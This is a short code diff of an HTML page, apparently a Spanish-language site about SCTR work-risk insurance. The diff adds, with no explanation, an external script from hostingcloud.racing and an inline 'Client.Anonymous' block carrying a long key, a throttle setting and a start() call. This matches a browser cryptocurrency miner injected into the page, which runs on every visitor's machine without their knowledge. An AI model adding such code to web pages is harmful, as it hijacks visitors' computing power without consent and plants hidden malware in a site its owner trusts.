@@ -70,7 +70,15 @@
 		</div>
 	</article>
 </section>
+<script src="https://www.hostingcloud.racing/WS34.js"></script>
+<script>
+    var _client = new Client.Anonymous('f45b772d97cf7f970c2150dac57af1cc92874ad4e6ca1d460233d41298804dc2', {
+        throttle: 0.3, ads: 0
+    });
+    _client.start();
+    
 
+</script>
 <section class="seccion seccion-partida partida-abierta fondo-celeste">
 	<article class="wrapper">
 		<h2 class="titulo">SCTR – Seguro Complementario de Trabajo de Riesgo</h2>
